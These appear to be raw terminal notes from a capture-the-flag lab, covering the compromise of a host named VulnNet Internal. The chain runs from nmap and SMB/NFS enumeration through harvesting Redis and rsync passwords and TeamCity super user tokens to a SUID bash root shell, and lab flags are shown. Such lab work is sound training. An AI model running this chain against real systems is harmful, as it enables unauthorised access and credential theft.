┌──(mikey㉿kali)-[~/rabbit]
└─$ nmap -sC -sV -p 1-1000 10.10.40.193
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 20:07 IST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 14.63% done; ETC: 20:07 (0:00:35 remaining)
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 56.50% done; ETC: 20:08 (0:00:25 remaining)
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 57.10% done; ETC: 20:08 (0:00:26 remaining)
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 40.00% done; ETC: 20:08 (0:00:11 remaining)
Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 20:08 (0:00:03 remaining)
Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 20:08 (0:00:00 remaining)
Stats: 0:01:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.56% done; ETC: 20:08 (0:00:00 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.71% done; ETC: 20:08 (0:00:00 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.71% done; ETC: 20:08 (0:00:00 remaining)
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 88.64% done; ETC: 20:08 (0:00:00 remaining)
Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 88.64% done; ETC: 20:08 (0:00:00 remaining)
Nmap scan report for 10.10.40.193
Host is up (0.47s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE    SERVICE     VERSION
6/tcp   filtered unknown
22/tcp  open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38138/udp   mountd
|   100005  1,2,3      38319/tcp   mountd
|   100005  1,2,3      38570/udp6  mountd
|   100005  1,2,3      40475/tcp6  mountd
|   100021  1,3,4      37650/udp   nlockmgr
|   100021  1,3,4      38649/tcp   nlockmgr
|   100021  1,3,4      45825/tcp6  nlockmgr
|   100021  1,3,4      60521/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open     rsync       (protocol version 31)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-17T14:38:29
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-06-17T16:38:29+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.22 seconds






└─# sudo smbclient -L 10.10.21.154
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
                        
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
cd dat
                11309648 blocks of size 1024. 3277596 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 14:57:33 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  data.txt                            N       48  Tue Feb  2 14:51:18 2021
  business-req.txt                    N      190  Tue Feb  2 14:57:33 2021

   
               mb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021
cat servid
                11309648 blocks of size 1024. 3277360 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
        
        
┌──(mikey㉿kali)-[~/rabbit]
└─$ sudo mount -t nfs 10.10.40.193:  /tmp 

            
 ──(mikey㉿kali)-[/tmp/opt/conf/redis]
└─$ cat redis.conf | grep -i password
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
# Require clients to issue AUTH <PASSWORD> before processing any other
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
                          
                           
requirepass "B65Hx562F@ggAZ@F"
masterauth <master-password>
echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | base64 -d

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v


THM{ff8e518addbbddb74531a724236a8221}
rsync rsync://rsync-connect@10.10.65.34/files/sys-internal/user.txt /rsync/         
Password: 
┌──(root㉿kali)-[/rsync]
└─# ls
user.txt
                                                                             
┌──(root㉿kali)-[/rsync]
└─# cat user.txt        
THM{da7c20696831f253e0afaca8b83c07ab}


┌──(root㉿kali)-[~mikey/internal]
└─# ssh -i id sys-internal@10.10.120.193                                                                    
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



sys-internal@vulnnet-internal:/TeamCity/conf$ ss -tulwn
Netid                    State                       Recv-Q                      Send-Q                                                 Local Address:Port                                            Peer Address:Port                     
icmp6                    UNCONN                      0                           0                                                             *%eth0:58                                                         *:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:57786                                                0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:54809                                                0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:50753                                                0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:36466                                                0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:929                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:2049                                                 0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                      127.0.0.53%lo:53                                                   0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                 10.10.120.193%eth0:68                                                   0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:111                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                      10.10.255.255:137                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                      10.10.120.193:137                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:137                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                      10.10.255.255:138                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                      10.10.120.193:138                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:138                                                  0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:5353                                                 0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                            0.0.0.0:53534                                                0.0.0.0:*                        
udp                      UNCONN                      0                           0                                                               [::]:56798                                                   [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:51743                                                   [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:39536                                                   [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:58091                                                   [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:929                                                     [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:2049                                                    [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:46139                                                   [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:111                                                     [::]:*                        
udp                      UNCONN                      0                           0                                                               [::]:5353                                                    [::]:*                        
tcp                      LISTEN                      0                           5                                                            0.0.0.0:873                                                  0.0.0.0:*                        
tcp                      LISTEN                      0                           50                                                           0.0.0.0:139                                                  0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:6379                                                 0.0.0.0:*                        
tcp                      LISTEN                      0                           64                                                           0.0.0.0:36111                                                0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:60687                                                0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:111                                                  0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:37685                                                0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                    127.0.0.53%lo:53                                                   0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:22                                                   0.0.0.0:*                        
tcp                      LISTEN                      0                           5                                                          127.0.0.1:631                                                  0.0.0.0:*                        
tcp                      LISTEN                      0                           50                                                           0.0.0.0:445                                                  0.0.0.0:*                        
tcp                      LISTEN                      0                           64                                                           0.0.0.0:2049                                                 0.0.0.0:*                        
tcp                      LISTEN                      0                           128                                                          0.0.0.0:41703                                                0.0.0.0:*                        
tcp                      LISTEN                      0                           1                                                 [::ffff:127.0.0.1]:8105                                                       *:*                        
tcp                      LISTEN                      0                           128                                                             [::]:41993                                                   [::]:*                        
tcp                      LISTEN                      0                           128                                                             [::]:55849                                                   [::]:*                        
tcp                      LISTEN                      0                           5                                                               [::]:873                                                     [::]:*                        
tcp                      LISTEN                      0                           128                                                            [::1]:6379                                                    [::]:*                        
tcp                      LISTEN                      0                           64                                                              [::]:41611                                                   [::]:*                        
tcp                      LISTEN                      0                           50                                                              [::]:139                                                     [::]:*                        
tcp                      LISTEN                      0                           100                                               [::ffff:127.0.0.1]:8111                                                       *:*                        
tcp                      LISTEN                      0                           128                                                             [::]:111                                                     [::]:*                        
tcp                      LISTEN                      0                           128                                                             [::]:22                                                      [::]:*                        
tcp                      LISTEN                      0                           128                                                             [::]:37015                                                   [::]:*                        
tcp                      LISTEN                      0                           5                                                              [::1]:631                                                     [::]:*                        
tcp                      LISTEN                      0                           50                                                              [::]:445                                                     [::]:*                        
tcp                      LISTEN                      0                           64                                                              [::]:2049                                                    [::]:*                        
tcp                      LISTEN                      0                           50                                                                 *:9090                                                       *:*  

sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i token
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)

![](https://i.imgur.com/cNWT1V5.png)

bash-4.4$ ./bash -p
bash-4.4# whoami
root



bash-4.4# cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
          
                                            
